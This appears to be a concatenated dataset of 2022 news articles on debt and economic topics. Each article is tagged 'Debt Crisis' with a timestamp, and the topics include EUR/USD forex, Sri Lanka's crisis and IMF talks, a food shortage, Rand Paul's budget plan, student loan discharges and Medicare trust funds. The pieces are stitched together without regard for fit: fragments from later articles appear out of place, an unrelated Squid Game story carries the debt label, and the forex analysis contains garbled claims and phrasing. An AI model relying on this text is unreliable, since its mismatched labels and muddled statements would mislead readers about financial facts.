""In the past few years, we've seen a huge shift in the housing market, and in parallel we're witnessing interest rates and inflation rising – all contributing to concerns around Canadian home ownership, affordability and Canadians' mental health,"" said Fitzgerald. ""As we move forward, it's imperative Canadians use resources available to them to talk to certified professionals and find ways to try and become more financially flexible and ensure they're taking a detailed look at their personal financial plans before making major financial decisions.""

According to the technical analysis of the pair: On the daily chart, the price of the euro currency pair against the dollar EUR/USD is moving towards the support level 1.0500.","The hopes of euro investors quickly evaporated in the recent hawkish statements from European Central Bank officials headed by Lagarde about the approaching date for raising the ECB interest rate 11 years ago. The EUR/USD currency pair tumbled from the resistance level 1.0773 to the support level 1.0506 and is stabilizing around the level 1.0515 at the beginning of this important week's trading. We indicated when the euro's recent gains will not last long because the US Federal Reserve will be the fastest and strongest in raising interest rates than the European Central.

Currently, traders are seeking the European Central Bank's support to smash bonds with the approach of price hikes. Markets are not convinced that the European Central Bank can raise interest rates and maintain bond yields for the most indebted eurozone members at the same time. Italy, one of the countries most exposed to rising borrowing costs, saw its 10-year debt drop after the biggest drop since the pandemic, as European Central Bank President Christine Lagarde outlined plans last Thursday to raise interest rates for the first time in more than a decade.

Meanwhile, the spread on German bonds approached towards levels that recently prompted the European Central Bank to start buying sovereign debt in an effort to stabilize the currency bloc as Covid-19 swept the continent in March 2020.

Investors are concerned about the lack of a credible plan to tackle so-called fragmentation - unjustified jumps in borrowing costs for weaker eurozone countries compared to stronger economies. Some say that only the new instrument, separate from previous bond-buying programs, can contain the spreads. Commenting on this, Nicholas Forrest, head of global fixed income at Candriam, a $180 billion asset manager, said: “This is an 'whatever it takes' moment for Lagarde. He was referring to a speech by former European Central Bank President Mario Draghi, who pledged to ensure the safety of the eurozone at all costs as the sovereign debt crisis erupted in 2012.

Meanwhile, Forrest is particularly cautious about Italian and Spanish debt given the volatility and potential for increased bond issuance from those countries. “The European Central Bank will need to avoid policy mistakes,” he said.

Global central banks face an unstable equilibrium process as they seek to combat rising prices without disrupting business activity. The situation in the eurozone is unique, with 19 disparate economies whose fiscal policies are not aligned. The fear is that without a plan, excessive widening of spreads could divert the ECB from its mission to combat inflation, forcing it to halt or even begin to reverse the rate-raising cycle.

What has so far been earmarked for retail processing - reinvestment from maturing debt accrued under the European Central Bank's pandemic asset purchase program - is widely seen as insufficient. Programs like the outright cash transactions, which Draghi created during the last crisis, still exist, but are seen as too inflexible to be appropriate now.

A new machine is in the works as Bloomberg reported in April. Details are still scarce. Some analysts believe that spreads of around 250 basis points could prompt the European Central Bank to intervene, even if only by disclosing the instrument. We are not at those levels yet. The German-Italian bond spread is at 225bp - far from the 500bp gap seen in the worst days of Europe's sovereign debt crisis.

But the uncertainty weakened the euro, erasing gains after Lagarde offered only vague reassurance that ""if needed in the future we can design, we can deploy the right tool"".

According to the technical analysis of the pair: On the daily chart, the price of the euro currency pair against the dollar EUR/USD is moving towards the support level 1.0500. This which will support the bears’ control of the trend and prepare to move towards the stronger support levels that are closest to it. This is according to the performance over the time period 1.0460 and 1.03800, respectively, as the last level is support for the move of technical indicators towards oversold levels, from which a resumption of buying can be considered.

It must be considered that this week's events are important and affect the forex market in general, and the US Central Bank's announcement on Wednesday is the most influential, and the movement may remain in narrow ranges until this date. On the upside, the bulls should return to the vicinity of the 1.0795 and 1.1000 resistance levels, otherwise the general trend will remain bearish.",Debt Crisis,2022-06-13 13:06:09

The world is experiencing a major food crisis with impacts being felt from food shortages in vulnerable economies to food price hikes in countries like Australia.

While this food crisis is predicted to last for years, there are some major causes and some possible solutions.

Ukraine exported most of its wheat and crop production through the ports of the Black Sea. Picture: Getty Images

Let’s take a look first at some of the key issues that have led to this crisis. And the first challenge is supply shortages.

The war in Ukraine sent a shockwave throughout global supply chains. Together, Russia and Ukraine accounted for more than 30 per cent of global wheat exports and 12 per cent of the world’s overall calories.

With the start of the war and its escalation, wheat production in Ukraine has decreased, while the global sanctions on Russia have reduced their exports due to banking and credit limits.

Another shock to global food supply chains has been the impact of extreme weather – like the recent floods in China and ongoing droughts in Brazil and Africa. These have disrupted crop growth and harvest yields in these major grain producers.

Then there’s the crippling disruption to global supply chains due to the lack of fertilisers to grow crops across the world.

Russia’s share of global nitrogenous fertiliser exports is almost 15 per cent.

In addition to the significant disruption in Russia’s fertiliser exports, production in both China and the European Union have declined. This is because natural gas is used to make fertilisers in Europe and the price of oil and gas has increased since the war began.

The lack of fertilisers to grow crops across the world has further disrupted global supply chains. Picture: Getty Images

Meanwhile, in China, coal is the major source of energy for fertiliser production, but the country’s ‘blue sky’ policy has forced a reduction in coal consumption.

The lack of fertilisers has a cascading effect on meat supply chains, where there will be insufficient feed (like barley and soybean) for livestock, and this then negatively affects the quality and quantity of meat and, subsequently, increases prices globally.

On top of these supply shortages, there’s also an increase in demand.

With the intensifying food shortages looming over global supply chains, countries have started hoarding major food products.

Additionally, major exporters of food products like Argentina, India, and many others have already put in place ‘export bans’ to increase their national reserves of food.

Issues around logistics are also playing their part.

The increase in energy prices, and global logistics issues caused by COVID-19, has resulted in much higher costs for food transportation. In addition, Ukraine exported most of its wheat through the ports of the Black Sea, but this isn’t feasible anymore, substantially decreasing the country’s logistics capacity for wheat and crops exports.

So, the key question then is: What’s the way out of this major food crisis and can global supply chains become more resilient toward future disruptions?

Another shock to global food supply chains has been the impact of extreme weather in several countries. Picture: Getty Images

Several studies – including my own research – have shown time and time again that achieving supply chain resilience must be a ‘multi-level’ effort. This means bringing different groups of stakeholders together to work collectively to soften the harm caused by the supply chain disruption.

We need a global effort to ensure food supply chains bounce back stronger from globally challenging disruptions, like the food crisis we’re experiencing. United Nations Secretary General, Antonio Guterres, recently said nations must “act together, urgently and with solidarity” to end crisis of food insecurity.

Naturally, an immediate and urgent solution is needed for countries that are most vulnerable to food crisis and cannot afford the current rising food prices. Ensuring immediate food supplies by international bodies like the World Food Program, as well as helping these countries with their debt crises, would be a strong first step.

Countries should be encouraged or incentivised to relax their export bans so that the supply shortages imposed by war and climate change can be somewhat compensated.

And those countries that are stockpiling food products should also be encouraged to share a portion of this stock with the most vulnerable populations suffering from food shortages.

In the long-term, farmers from our most vulnerable regions should be equipped with the expertise and infrastructure to produce locally.

So, while the current food supply crisis looks set to continue for some time, there are practical steps our governments, policy makers and producers can take to mitigate the worst of it for the world’s most vulnerable people.

Like some other South Asian nations, Sri Lanka has remained neutral on the war in Europe.
“China has agreed to come in with the other countries to give relief to Sri Lanka, which is a first step,” Wickremesinghe said.","Sri Lanka may be compelled to buy more oil from Russia as the island nation hunts desperately for fuel amid an unprecedented economic crisis, the newly appointed prime minister said.

Prime Minister Ranil Wickremesinghe said he would first look to other sources, but would be open to buying more crude from Moscow. Western nations largely have cut off energy imports from Russia in line with sanctions over its war on Ukraine.

In a wide-ranging interview with The Associated Press on Saturday, Wickremesinghe also indicated he would be willing to accept more financial help from China, despite his country’s mounting debt. And while he acknowledged that Sri Lanka’s current predicament is of “its own making,” he said the war in Ukraine is making it even worse — and that dire food shortages could continue until 2024. He said Russia had also offered wheat to Sri Lanka.

Wickremesinghe, who is also Sri Lanka’s finance minister, spoke to the AP in his office in the capital, Colombo, one day shy of a month after he took over for a sixth time as prime minister. Appointed by President Gotabaya Rajapaksa to resolve an economic crisis that has nearly emptied the country’s foreign exchange reserves, Wickremesinghe was sworn in after days of violent protests last month forced his predecessor, Rajapaksa’s brother Mahinda Rajapaksa, to step down and seek safety from angry crowds at a naval base.

Sri Lanka has amassed $51 billion in foreign debt, but has suspended repayment of nearly $7 billion due this year. The crushing debt has left the country with no money for basic imports, which means citizens are struggling to access basic necessities such as food, fuel, medicine — even toilet paper and matches. The shortages have spawned rolling power outages, and people have been forced to wait days for cooking gas and gasoline in lines that stretch for kilometers (miles).

Two weeks ago, the country bought a 90,000-metric-ton (99,000-ton) shipment of Russian crude to restart its only refinery, the energy minister told reporters.

Wickremesinghe did not comment directly on those reports, and said he did not know whether more orders were in the pipeline. But he said Sri Lanka desperately needs fuel, and is currently trying to get oil and coal from the country’s traditional suppliers in the Middle East.

“If we can get from any other sources, we will get from there. Otherwise (we) may have to go to Russia again,” he said.

Officials are negotiating with private suppliers, but Wickremesinghe said one issue they face is that “there is a lot of oil going around which can be sourced back informally to Iran or to Russia.”

“Sometimes we may not know what oil we are buying,” he said. “Certainly we are looking at the Gulf as our main supply.”

Since Russia’s invasion of Ukraine in late February, global oil prices have skyrocketed. While Washington and its allies are trying to cut financial flows supporting Moscow’s war effort, Russia is offering its crude at a steep discount, making it extremely enticing to a number of countries.

Like some other South Asian nations, Sri Lanka has remained neutral on the war in Europe.

Sri Lanka has received and continues to reach out to numerous countries for help — including the most controversial, China, currently the country’s third-largest creditor. Opposition figures have accused the president and the former prime minister of taking on a slew of Chinese loans for splashy infrastructure projects that have since failed to generate profit, instead adding to the country’s debt.

Critics have also pointed to a beleaguered port in the hometown of then-President Mahinda Rajapaksa, Hambantota, built along with a nearby airport as part of China’s Belt and Road Initiative projects, saying they cost too much and do too little for the economy.

“We need to identify what are the projects that we need for economic recovery and take loans for those projects, whether it be from China or from others,” Wickremesinghe said. “It’s a question of where do we deploy the resources?”

The prime minister said his government has been talking with China about restructuring its debts. Beijing had earlier offered to lend the country more money but balked at cutting the debt, possibly out of concern that other borrowers would demand the same relief.

“China has agreed to come in with the other countries to give relief to Sri Lanka, which is a first step,” Wickremesinghe said. “This means they all have to agree (on) how the cuts are to take place and in what manner they should take place.”

Sri Lanka is also seeking financial assistance from the World Food Program, which may send a team to the country soon, and Wickremesinghe is banking on a bailout package from the International Monetary Fund. But even if approved, he doesn’t expect to see money from the package until October onwards.

Wickremesinghe acknowledged that the crisis in Sri Lanka has been of its “own making.” Many have blamed government mismanagement, deep tax cuts in 2019, policy blunders that devastated crops and a sharp plunge in tourism due to the coronavirus pandemic. But he also stressed that the war in Ukraine, which has thrown global supply chains into a tailspin and pushed fuel and food prices to unaffordable levels, has made things much worse.

“The Ukraine crisis has impacted our ... economic contraction,” he said, adding that he thinks the economy will shrink even further before the country can begin to recoup and rebuild next year.

“I think by the end of the year, you could see the impact in other countries” as well, he said. “There is a global shortage of food. Countries are not exporting food.”

In Sri Lanka, the price of vegetables has jumped threefold while the country’s rice cultivation is down by about a third, the prime minister said.

The shortages have affected both the poor and the middle classes, triggering months of protests. Mothers are struggling to get milk to feed their babies, as fears of a looming hunger crisis grow.

Wickremesinghe said he felt terrible watching his nation suffer, “both as a citizen and a prime minister.”

He said he hasn’t ever seen anything like this in Sri Lanka — and didn’t think he ever would. “I have generally been in governments where I ensured people had three meals and their income increased,” he said. “We’ve had difficult times. ... But not like this. I have not seen ... people without fuel, without food.”",Debt Crisis,2022-06-13 02:50:19

WASHINGTON, D.C. – Today, U.S. Senator Rand Paul (R-KY) introduced his “Six Penny Plan” federal budget that will balance within five years.

“Five years ago, we could balance our budget with a freeze in spending without cutting anything. Since then, our debt has skyrocketed to $30 trillion with $2 trillion just from this past year,” said Dr. Paul. “We are now in a situation that a simple penny, two, three, or even a five pennies per-dollar reduction is insufficient to balance our budget. It requires six. We cannot keep ignoring this problem at the expense of taxpayers, and my budget will put our nation on track to solve this crisis that Congress created.”

""CBO's newest budget projection illustrates the government's fiscally perilous path. Without a change of course, trillions will be added to the debt, a burden being unfairly dumped onto future generations of taxpayers. Senator Paul's Six Penny Plan approach would take smart, incremental steps towards fiscal responsibility by cutting 6 cents for every dollar of spending, while also preventing tax hikes, and making much-needed reforms to the budget and scorekeeping process,” said Demian Brady, Vice President of Research at the National Taxpayers Union Foundation.

“The biggest threats to national security are the national debt and out-of-control spending. There is bipartisan support in Congress to continue spending taxpayer dollars in an irresponsible fashion; however, there is no consensus on how to get our federal budget under control and address the future of entitlement programs, like Social Security. Thankfully, Senator Rand Paul is once again leading the charge with his “Six Penny Plan,"" which will help the federal government get its finances back on track. With inflation at an all-time high, now is the time for members of Congress to reassess their spending habits and take on the national debt crisis in a serious manner,” said Adam Brandon, President of FreedomWorks.

“Unfortunately, the Biden Administration continues to engage in economic malpractice by restricting the development of reliable and affordable American energy and by advocating for even additional inflationary spending plans. As we face the real threat of stagflation for the first time since the Jimmy Carter era, we need a major course correction from policymakers in Washington. Senator Rand Paul should be commended for his bold approach to address our $30 trillion national debt. Sen. Paul’s common sense spending reforms put taxpayers first by addressing the root cause of our national debt: overspending,” said Jonathan Williams, ALEC Chief Economist and Vice President of Policy.

“America is sitting on a national debt time bomb, yet most of our politicians in Washington are simply squabbling over how best to waste more of our money. But Senator Paul is one of the rare few actually working to protect Americans’ wallets. Senator Paul’s penny plan is a long overdue, common-sense plan that would incrementally restore fiscal responsibility to our out-of-control federal budget. Anyone who cares about the next generation’s financial future ought to support this sensible, responsible plan,” said Brad Polumbo, economics journalist and policy analyst.

“Senator Rand Paul has been fighting for fiscal responsibility and raising the alarm on federal spending with his Penny Plan since 2017. Had Congress listened, then we could have a balanced budget today. Instead, we’ve seen Congress exacerbate inflationary pressures with unprecedented spending levels. As President of the Taxpayers Protection Alliance, I thank Senator Rand Paul for this commonsense solution to the balanced budget and protect taxpayers,” said David Williams, President of The Taxpayers Protection Alliance.

“America is facing both an inflation crisis and a debt crisis, and they’re both being caused by Washington’s addiction to spending. Yet even with inflation over 8% and a national debt that has surpassed $30 trillion, Democrats in Congress continue to advocate for more spending, which will only make both crises worse. Fortunately, Senator Paul has introduced the “Six Penny Plan,” which would cut wasteful spending and put the United States on a path to a balanced budget within five years. Americans deserve a serious plan to get our fiscal house in order, and Senator Paul has delivered,” said Garrett Bess, Vice President of Heritage Action.

“Senator Rand Paul has long been a champion of balancing the federal budget and protecting the American taxpayer. Senator Paul has a plan that will balance the budget in five years. Interestingly, if Congress had voted for Senator Paul’s plan five years ago, we would not be suffering runaway inflation, economic downturns, slowdowns, severe shortages, and empty shelves at the store. And we’d be celebrating a balanced budget too! If we wait even longer to take action, we will suffer more inflation, larger and larger deficits, and more economic instability. And then it will take much larger cuts to get things back on track. So now is the time to act before the problem becomes so large that it cannot practically be fixed,” said George Landrith, President of Frontiers for Freedom.

Background:

Dr. Paul offered his first balanced budget in 2011. In 2017, Dr. Paul introduced his first budget that balanced using a flexible, top-line, on-budget spending limitation. That budget was not a reduction in spending, but a simple five-year freeze. Had that budget been adopted then, the budget would have balanced this year.

By 2018, the nation’s fiscal imbalance had worsened. Dr. Paul again offered a budget that balanced, but now required a one penny per-dollar reduction in spending off the top-line. In his accompanying report, Dr. Paul warned of the risk that continued deficit spend would make the U.S. more vulnerable to foreign advisories and hinder our capacity to respond to emergencies. In particular, he noted inflation was how such risks would manifest. Congress ignored his warning then, and now we see an inflation rate of 8.3 percent.

In 2019, the situation was still worse. Whereas in the previous year a single penny on the dollar was required to balance, now it required two cents. Dr. Paul again offered a now “Pennies Plan,” which again would have balanced in just 5 years.

Since Dr. Paul’s first spending freeze budget, Congress has added nearly $11 trillion to the federal debt. The annual structural deficit has more than doubled, and interest payments on the debt have grown by 32 percent. Inflation has reached a 40-year high. And now, a simple penny or two is insufficient to balance.

Now, it requires SIX pennies to balance the budget in five years.

Instead of celebrating a balanced budget this year, and again allowing spending to grow at historic norms, we are faced with a weakened and teetering economy, a prescription for our ills that is six times more dramatic than it ever had to be.

Congress’s refusal to accept the responsibility to act as good stewards of American taxpayer dollars has caused our bleak financial position. Americans everywhere are feeling the effects of historical high inflation and sustaining labor and supply chain issues. Short-term political gains of the past, are in fact causing us harm now. Not to our children and grandchildren off in the future, but to us here today.

In recent weeks, Russia’s invasion of Ukraine has exacerbated global economic risks. There is a fourth element, however, that could make the mix combustible: the high debt of emerging markets and developing economies.

These economies account for about 40 percent of global GDP. On the eve of the war, many of them were already on shaky ground. Following up on a decade of rising debt, the COVID-19 crisis expanded total indebtedness to a 50-year high—the equivalent of more than 250 percent of government revenues. Close to 60 percent of the poorest countries were already in debt distress or at high risk of it. Debt-service burdens in middle-income countries were at 30-year highs. Oil prices were surging. And interest rates were rising across the world.

In such conditions, history shows, one more surprise is all it takes to touch off a crisis. The Ukraine war immediately darkened the outlook for many developing countries that are major commodity importers or highly dependent on tourism or remittances. Across Africa, for example, external borrowing costs are rising: bond spreads are up by an average of 20 basis points. The calculus for countries for high debt, limited reserves, and payments coming up soon is suddenly very different: Sri Lanka, for example, opted last week to consider an International Monetary Fund-supported program in the face of a heavy debt service burden.

Over the next 12 months, as many as a dozen developing economies could prove unable to service their debt. That’s a large number, but it would not constitute a systemic global debt crisis—it would be nothing like the Latin American debt crisis of the 1980s, for example. It would be nothing like the 30-plus cases of unsustainable debt that prompted the establishment of the Heavily Indebted Poor Countries Initiative (HIPC) in the mid-1990s. Yet it would still be significant—the largest spate of debt crises in developing economies in a generation.

These crises, should they occur, would play out in a transformed landscape. Thirty years ago, developing economies owed most of their foreign debt to governments—official bilateral creditors—nearly all of whom were members of the Paris Club. Not so today: at the end of 2020, low- and middle-income economies owed five times as much to commercial creditors as they did to bilateral creditors. This year, of the nearly $53 billion that low-income countries will need to make in debt-service payments on their public and publicly guaranteed debt, just $5 billion will go to Paris Club creditors. Much of the debt of developing economies, moreover, now involves variable interest rates — meaning they could rise almost as suddenly as rates on credit-card debt.",Debt Crisis,2022-03-28 07:00:00

It's officially official: Netflix is bringing back its worldwide hit ""Squid Game"" for a second season.

Creator and director Hwang Dong-hyuk had already acknowledged the pressure for a second season and said he was ""in the planning process"" last year, but Netflix's confirmation comes with a few more details.

""It took 12 years to bring the first season of Squid Game to life last year,"" Hwang said in Netflix's Sunday announcement. ""But it took 12 days for Squid Game to become the most popular Netflix series ever.""

The dystopian drama from South Korea follows a group of people who, desperate for money, participate in a series of deadly schoolyard games. It shot to global success and is thought to be Netflix's most-watched show yet, though the streaming service doesn't release exact numbers.

In the Sunday announcement, Hwang confirmed some details about the plot and characters.

""And now, Gi-hun returns,"" Hwang said. ""The Front Man returns. Season 2 is coming. The man in the suit with ddakji might be back. You’ll also be introduced to Young-hee’s boyfriend, Cheol-su.""

Netflix shared a 10-second teaser trailer featuring the giant animatronic doll that features heavily in the show's first episode.

It's unclear when the second season of ""Squid Game"" will come out. It might not even be finished. In an interview with Vanity Fair published last month, Hwang anticipated that the season could release by the end of 2023 or 2024.

Hwang told the magazine he was in ""final discussions"" with Netflix about the season and only had about three pages' worth of ideas at the time.

Most TV shows in South Korea run for just one season, but ""Squid Game's"" continuation was never truly in doubt. At a red carpet event for the show in November 2021, Hwang said of its popularity, ""I almost feel like you leave us no choice.""

He reiterated that when the IMF determines that the country's debt is not sustainable, the country needs to take steps to restore debt sustainability before the IMF can move forward with the financing programme.
The IMF in May said that it requires sufficient assurance from the country that it will restore debt sustainability during the debt restructuring process.","The IMF is planning an in-person mission in the coming weeks to Sri Lanka, which is facing a very difficult economic condition, for discussions on a financial arrangement, its spokesman has said but emphasised that country needs to take steps to restore debt sustainability before the global lender can move on a financing programme.

Monetary Fund Spokesperson Gerry Rice said the global financial body was committed to support at this difficult time, in line with the IMF policies.

Clearly is facing a very difficult economic condition and severe balance of payments problems. We are deeply concerned about the impact of the ongoing crisis, particularly the humanitarian concern, that is the impact on people, IMF Spokesperson Gerry Rice told a briefing on Thursday.

His statement came a day after Sri Lankan Prime Minister Ranil Wickremesinghe said that he has urged IMF chief Kristalina Georgieva to ""expedite"" its assistance programme to the country.

Rice said the IMF is monitoring Sri Lanka's situation closely and the IMF is planning an in-person mission to Colombo in the coming weeks to engage in policy discussions on the programme, building on the technical discussions that already took place in May.

has decided to seek the assistance of the Washington-based global lender to combat the worst economic crisis since its independence from Britain in 1948. The talks between Sri Lanka and the IMF commenced on April 18.

Sri Lanka has already initiated measures to restructure its foreign debts -- a prerequisite for an IMF programme -- after the government suspended all the external debt repayments on April 12.

Rice said the timing of a staff-level agreement will depend in part on the strength of the policies that the authorities would propose and would commit to.

The spokesman emphasised that since Sri Lanka's debt was assessed as unsustainable, board approval for any programme would require adequate assurances that authorities would take measures to restore debt sustainability before a financial arrangement can be considered.

He emphasised that a staff-level agreement would go to the IMF board for approval to make the final decision.

The IMF Spokesman affirmed that Managing Director Georgieva spoke to the Sri Lankan Prime Minister Ranil Wickremesinghe on Tuesday and they discussed the IMF's engagement with Sri Lanka in length.

We are engaging as much as we can to see how we can help, but again too early for us to discuss the magnitude of a potential financing or a specific date for either the staff level agreement or when this might go to the board, he said.

He reiterated that when the IMF determines that the country's debt is not sustainable, the country needs to take steps to restore debt sustainability before the IMF can move forward with the financing programme.

On Thursday last, Wickremesinghe had said the government was targeting USD 5 billion this year for repayments, plus a further USD 1 billion to bolster the country's reserves.

He said Sri Lanka's bridging finance requirements would depend on an agreement with the IMF being reached.

Addressing Parliament on Tuesday, Wickremesinghe said Sri Lanka will need USD 5 billion to ensure that the people's daily lives are not disrupted for the next six months.

The nearly bankrupt country, with an acute foreign currency crisis that resulted in foreign debt default, announced in April that it is suspending nearly USD 7 billion foreign debt repayment due for this year out of about USD 25 billion due through 2026. Sri Lanka's total foreign debt stands at USD 51 billion.

The IMF in May said that it requires sufficient assurance from the country that it will restore debt sustainability during the debt restructuring process.

The economic crisis has prompted an acute shortage of essential items like food, medicine, cooking gas and other fuel, toilet paper and even matches, with Sri Lankans for months being forced to wait in lines lasting hours outside stores to buy fuel and cooking gas.

After heeding Durbin’s calls since 2015, the Department of Education approved widespread discharge of all remaining federal student loans for borrowers who attended predatory, for-profit Corinthian Colleges

WASHINGTON – U.S. Senate Majority Whip Dick Durbin (D-IL) delivered a speech on the Senator floor applauding the Department of Education’s recent decision to discharge all remaining federal student loans for those who attended any campus owned or run by the predatory Corinthian Colleges. In April 2015, after Corinthian abruptly closed all of its schools, Durbin first urged the Department to issue widespread relief as he stood in front of a Corinthian-operated school in Chicago with then-Illinois Attorney General Lisa Madigan.

In his remarks, Durbin called out Corinthian Colleges for its avaricious tactics to recruit students.

“I believe that they [for-profit colleges] have really posed an unscrupulous threat to unsuspecting students, to taxpayers, and to the solvency of federal student aid programs. Corinthian Colleges, sounds great doesn't it? That was one of them. One of the largest for-profit college companies and one of the worst. It operated more than 100 campuses, including six in my home state of Illinois, under names like Everest Colleges, WyoTech, Heald Colleges. At its peak, Corinthian enrolled more than 110,000 students, raking in a more than $1.4 billion sum from the federal treasury every year… How did Corinthian attract its students? It lied. It invested heavily in marketing and advertising. It created a business model that relied heavily on predatory sales practices. It deliberately misled students into taking on more debt than they could ever, ever repay,” Durbin began.

Durbin spoke about how these sales practices that drew students in under false pretenses led to a lawsuit, headed by then-California Attorney General Kamala Harris. The California lawsuit was one in a string of lawsuits and investigations that ultimately resulted in the closure of all Corinthian Colleges.

“In 2013, Vice President Kamala Harris, who was then California’s Attorney General, sued this company for predatory and deceptive business practices. That lawsuit was followed by investigations by four different federal agencies and more than 20 State Attorneys General for a variety of consumer fraud… And on April 26, 2015, the whole Corinthian Colleges house of cards collapsed…The announcement left 16,000 students stunned and worried about how they would ever pay off the debt they incurred and about the degrees they would never be able to finish,” Durbin said.

“Back in 2015, I called for widespread relief for borrowers defrauded by Corinthian. Last week, these borrowers finally received some long-overdue relief. Seven years after they closed Corinthian, they finally got relief from the student loans they incurred…In its largest student loan forgiveness action ever, the Education Department recognized the rot that was at the core of Corinthian Colleges and announced it was going to wipe out $5.8 billion in student loan debt owed by 560,000 borrowers who attended the company’s for-profit schools…I applaud Education Secretary Cardona and President Biden for their leadership on this simple issue of justice,” Durbin continued.

Durbin went on to discuss additional solutions to the student debt crisis, including the option to discharge student loans in bankruptcy. In August 2021, Durbin introduced the bipartisan FRESH START Through Bankruptcy Act, which would restore the ability for struggling borrowers to seek a bankruptcy discharge for federal student loans after a waiting period of ten years.

“I also believe that we need to re-think the provisions in our federal bankruptcy laws that make student loan debt one of the few debts that cannot be discharged in bankruptcy proceedings…Bankruptcy should be allowed to be used as a last resort for borrowers who have no other place to turn,” Durbin said.

“It is in America’s national and economic interest to make sure that student loans are a prudent investment and to protect unsuspecting students from unscrupulous organizations like these for-profit colleges and universities,” Durbin concluded.

The Department of Education’s decision will provide $5.8 billion in relief through group discharge for 560,000 borrowers across the country. This relief will cover all borrowers who attended any Corinthian Colleges school from 1995 to its collapse in 2015, making this the largest loan discharge the Department has ever made. Due to Corinthian Colleges’ systemic abuse and fraud, the group discharge will apply to all borrowers, including those who did not submit a borrower defense claim. Corinthian students who have already repaid some or all of their loans will be eligible for rebates.

At the time of Corinthian Colleges’ closure, the for-profit college was receiving taxpayer dollars by participating in the federal Title IV program and still enrolling new students in several states. Corinthian was under investigation by the Securities and Exchange Commission, the Department of Justice, and more than 20 state Attorneys General, including in Illinois, for using misleading job placement rates and predatory marketing tactics. They were sued by the Consumer Financial Protection Bureau and the state Attorneys General of California, Massachusetts, and Wisconsin for false and misleading advertisements. All the while, the institution raked in more than a billion dollars from taxpayers a year.

If a trust fund is still the preferred tool for spending discipline, then its tap on the general fund must be strictly limited.
For instance, these payments could be tied to growth in the economy irrespective of how fast Medicare spending escalates.","The two trust funds tracking Medicare income and outgo—for Hospital Insurance (HI) and Supplementary Medical Insurance (SMI)—are supposed to help policy makers see and address financial problems before they escalate into more difficult challenges. However, because Congress designed SMI so that, unlike HI, it can never become insolvent, the construct is weak. The risk now is that Medicare spending is pushing the federal government toward a debt crisis, which in turn may lead to abrupt and indiscriminate cuts in program benefits and other vital programs.

Indeed, Medicare’s trust funds as currently constituted are so flawed that they could be impeding, rather than facilitating, sensible reforms. As has been the case for several years, the 2022 Medicare trustees report, just released by the administration, will generate understandable concerns about the projected depletion of HI reserves. While solving that problem is necessary, it is far from sufficient, as HI finances less than half of Medicare’s annual expenditures. An excessive focus on HI may lead policy makers to assume that SMI spending requires no changes because projections show its trust fund with a positive balance well into the future.

With Medicare now in its second half century, it should not be surprising that many aspects of its original design need updating and modernization, including the framework used to enforce financial discipline across generations. Reform should ensure total Medicare expenditures are matched with sources of funding that do not presume ever-increasing levels of federal debt.

Origins Of The Dual Trust Funds

When Congress approved Medicare in 1965, Social Security served as a partial template. The basic idea was to append a new publicly run health insurance plan to the cash benefits provided to the elderly and disabled through the Old Age and Survivors Insurance and Disability Insurance programs. As with Social Security, Congress opted to use trust funds to align Medicare’s outgo with income over time; a projection spanning 75 years can provide early warning of impending problems.

There was one important difference with Social Security, however; not all of Medicare’s expenses would be financed from payroll taxes collected from current workers and their employers and held in a single trust fund. Instead, Congress created two trust funds for Medicare, only one of which—for HI, or part A—conforms to the Social Security model, with revenue from payroll taxes on current workers. The other, for SMI, which pays for parts B and D of the program, gets its revenue from premiums paid by current beneficiaries, and, importantly, from the Treasury’s general fund as needed to fully finance all spending. Consequently, the SMI cannot become insolvent, while the HI can.

The use of two trust funds to finance Medicare is a reflection of the political and market dynamics of the 1960s. At that time, the dominant insurers were the Blues plans, with “cross” policies identified historically with hospital expenses and “shield” versions with physician care. Congress wanted to mirror what many Americans were experiencing in the private market.

There was another political consideration, too; organized physician groups were suspicious of an expanded government role in financing medical care. A separate Medicare trust fund dedicated to non-hospital care, with funding that was reserved for physician services and other ambulatory care and was partially subsidized out of general funds, was a factor in securing the profession’s support.

The Hospital Insurance Trust Fund Shortfall

The 2022 Medicare trustees report, released on June 2nd, provides updates projections of the pace of depletion of HI reserves.

The new projections are likely to be viewed in Congress with some relief because HI insolvency is modestly delayed. In the 2021 report, the trustees estimated that HI would run through its reserves in 2026, after which its annual obligations would exceed incoming revenue on a permanent basis. Over 75 years, the trustees projected HI had a deficit of $4.9 trillion, measured in present value terms. In this year’s forecast, HI will deplete its reserves in 2028, and its shortfall over 75 years is projected to remain as it was in last year’s forecast -- $4.9 trillion.

Perpetual SMI Solvency

The SMI trust fund faces no such shortfall because, as described above, it can be fully financed from general funds as needed. Thus, the same 2022 report that tags HI with a multitrillion dollar deficit shows SMI with steady reserves over the next 75 years even though it accounts for about 60 percent of total program spending.

And yet the Treasury’s contributions to SMI are not costless; they expand the government’s annual budget deficits, and thus also add to federal debt. The general fund works as a catch-all for government tax receipts, borrowed money, and spending. Taxes dedicated to specific purposes come into the general account and then are credited to the separate ledgers tracking those activities; spending is assigned in a similar fashion. When total federal spending exceeds revenue, as it does today and will for many years in the future, the deficit is covered with borrowing. Consequently, when the general fund makes its required payments to SMI, the money comes either from existing, non-dedicated taxes (such as individual and corporate income taxes) or from amounts lent to the government by creditors. Because money is fungible, assuming that SMI has first call on income taxes only means that other necessary federal activities must be financed with more debt.

None of this would matter if the amounts involved were trivial, but that is not the case with SMI. The 2022 trustees’ report estimates the general fund contribution to SMI would be $413.9 billion in 2022 and $6.0 trillion over the period 2022 to 2031, reaching the equivalent of about 30 percent of all individual and corporate income tax receipts at the end of 75 years.

Congress hoped beneficiary premiums would serve as a check on SMI cost growth because rapid inflation would fuel political complaints. Initially, the premiums were set to cover half of program expenses. As costs soared in the program’s early years, Congress backed off the policy and allowed premiums to grow more slowly than part B spending. Eventually, a new benchmark was set, with beneficiary contributions covering 25 percent of program costs. When the prescription drug benefit was created in 2003, it also was financed with a 25/75 split between beneficiary premiums and general fund contributions.

With the general fund covering most of the added costs, SMI spending has risen rapidly even as beneficiaries pay more too. In 2022, the standard beneficiary part B premium is $170.10, which is $21.60, or 15 percent, above what it was in 2021 (there is a separate premium for part D coverage, which varies by the plan selected; the base premium is $33 in 2022). Since 2000, the nominal value of the Part B premium has gone up at an average annual rate of 6.4 percent, more than 4.0 percentage points faster than the general inflation rate.

General fund support for SMI is now one of the most consequential line items in the entire federal budget, as shown in exhibit 1. Shortly after enactment, in 1970, it totaled 0.2 percent of gross domestic product (GDP). By 2020, it was 2.0 percent of GDP. The trustees estimate it will reach 2.8 percent by 2050.

Medicare And Federal Debt

